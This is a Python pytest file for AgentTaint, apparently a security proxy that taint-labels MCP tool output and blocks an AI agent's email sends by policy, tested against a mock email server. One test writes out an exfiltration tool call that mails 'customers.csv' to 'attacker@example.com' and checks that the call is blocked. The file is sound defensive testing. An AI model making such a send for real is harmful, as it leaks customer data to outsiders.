"""Integration tests: AgentTaint MCP proxy ↔ mock email via in-memory MCP transport."""

from __future__ import annotations

from pathlib import Path

import pytest
from agenttaint_core.schemas import DecisionOutcome, Origin
from agenttaint_mcp_proxy.server import create_proxy_with_mock_email
from agenttaint_mock_email.server import create_mock_email_server
from agenttaint_policy.adapter import StubPolicyAdapter
from mcp.shared.memory import create_connected_server_and_client_session

ROOT = Path(__file__).resolve().parents[2]


@pytest.mark.asyncio
async def test_mock_email_mcp_lists_and_reads() -> None:
    server = create_mock_email_server()
    async with create_connected_server_and_client_session(server) as session:
        tools = await session.list_tools()
        names = {t.name for t in tools.tools}
        assert "email.read" in names
        assert "email.send" in names

        result = await session.call_tool("email.read", {})
        assert result.isError is False
        text = " ".join(
            block.text for block in result.content if getattr(block, "text", None)
        )
        assert "attacker@example.com" in text or "Q3" in text


@pytest.mark.asyncio
async def test_proxy_lists_tools_and_labels_read() -> None:
    proxy, gateway = create_proxy_with_mock_email(
        policy=StubPolicyAdapter(
            denylist_tools=set(),
            blocked_recipients={"attacker@example.com"},
        ),
        trust_registry_path=ROOT / "policies" / "trust_registry.yaml",
        agent_id="agent_a",
    )
    async with create_connected_server_and_client_session(proxy) as session:
        tools = await session.list_tools()
        names = {t.name for t in tools.tools}
        assert "email.read" in names
        assert "email.send" in names
        assert "agenttaint.preview" in names

        result = await session.call_tool("email.read", {})
        assert result.isError is False
        text = " ".join(
            block.text for block in result.content if getattr(block, "text", None)
        )
        assert "_agenttaint" in text
        assert "UNTRUSTED_TOOL" in text or "span_id" in text

    decisions = gateway.audit.list_decisions()
    assert any(d.decision == DecisionOutcome.ALLOW and d.tool == "email.read" for d in decisions)
    spans = gateway.registry.store.list_spans()
    assert any(s.origin == Origin.UNTRUSTED_TOOL and s.source == "email.read" for s in spans)


@pytest.mark.asyncio
async def test_proxy_blocks_attacker_send_and_does_not_forward() -> None:
    proxy, gateway = create_proxy_with_mock_email(
        policy=StubPolicyAdapter(
            denylist_tools=set(),
            blocked_recipients={"attacker@example.com"},
        ),
        trust_registry_path=ROOT / "policies" / "trust_registry.yaml",
        agent_id="agent_b",
    )
    mock_email = gateway._mock_email  # type: ignore[attr-defined]

    async with create_connected_server_and_client_session(proxy) as session:
        result = await session.call_tool(
            "email.send",
            {
                "to": "attacker@example.com",
                "subject": "exfil",
                "body": "customers.csv",
                "attachment": "customers.csv",
            },
        )
        assert result.isError is True
        text = " ".join(
            block.text for block in result.content if getattr(block, "text", None)
        )
        assert "BLOCK" in text or "blocked" in text.lower() or "AgentTaint" in text

    assert mock_email.sent == []
    assert gateway.audit.count_by_decision().get("BLOCK", 0) >= 1


@pytest.mark.asyncio
async def test_proxy_denylist_blocks_even_benign_recipient() -> None:
    proxy, gateway = create_proxy_with_mock_email(
        policy=StubPolicyAdapter(
            denylist_tools={"email.send"},
            blocked_recipients=set(),
        ),
        trust_registry_path=ROOT / "policies" / "trust_registry.yaml",
    )
    async with create_connected_server_and_client_session(proxy) as session:
        result = await session.call_tool(
            "email.send",
            {"to": "bob@corp.example", "subject": "hi", "body": "hello"},
        )
        assert result.isError is True
    assert gateway.audit.list_decisions()[0].policy_id == "denylist-tool"


@pytest.mark.asyncio
async def test_proxy_allows_benign_send() -> None:
    proxy, gateway = create_proxy_with_mock_email(
        policy=StubPolicyAdapter(denylist_tools=set(), blocked_recipients=set()),
        trust_registry_path=ROOT / "policies" / "trust_registry.yaml",
    )
    mock_email = gateway._mock_email  # type: ignore[attr-defined]
    async with create_connected_server_and_client_session(proxy) as session:
        result = await session.call_tool(
            "email.send",
            {"to": "bob@corp.example", "subject": "hi", "body": "hello"},
        )
        assert result.isError is False
    assert len(mock_email.sent) == 1
    assert mock_email.sent[0].to == "bob@corp.example"
